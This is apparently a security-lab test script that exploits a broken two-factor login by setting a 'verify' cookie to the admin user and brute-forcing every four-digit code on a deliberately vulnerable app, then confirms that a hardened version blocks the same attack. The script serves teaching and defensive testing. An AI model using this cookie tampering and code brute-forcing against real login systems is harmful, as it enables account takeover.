"""Lab 3 (2FA broken logic): change the 'verify' cookie to the victim and brute-force their code."""
import requests

from common import NAIVE, SECURE, report, secure_login


def run():
    s = requests.Session()
    s.cookies.set("verify", "admin")                 # we never knew admin's password
    s.get(NAIVE + "/login2")                         # makes the server create admin's code
    tries = 0
    for number in range(10000):
        tries += 1
        r = s.post(NAIVE + "/login2", data={"code": f"{number:04d}"}, allow_redirects=False)
        if r.status_code == 302:
            break
    naive_worked = "All users" in s.get(NAIVE + "/admin").text

    s = secure_login("shopper")                      # the attacker's own account
    s.cookies.set("verify", "admin")
    sent_back = 0
    for number in range(50):
        r = s.post(SECURE + "/auth/two-factor", allow_redirects=False,
                   data={"code": f"{number:06d}", "user": "admin", "username": "admin", "user_id": "2"})
        if r.headers.get("Location", "").endswith("/auth/login"):
            sent_back += 1
    admin = s.get(SECURE + "/admin/", allow_redirects=False).status_code
    blocked = sent_back == 50 and admin == 403
    return report("2FA bypass (Lab 3)", naive_worked, f"logged in as admin after {tries} code guesses",
                  blocked, f"50/50 code tries sent back to login (no pending login), /admin/ -> {admin}")


if __name__ == "__main__":
    run()
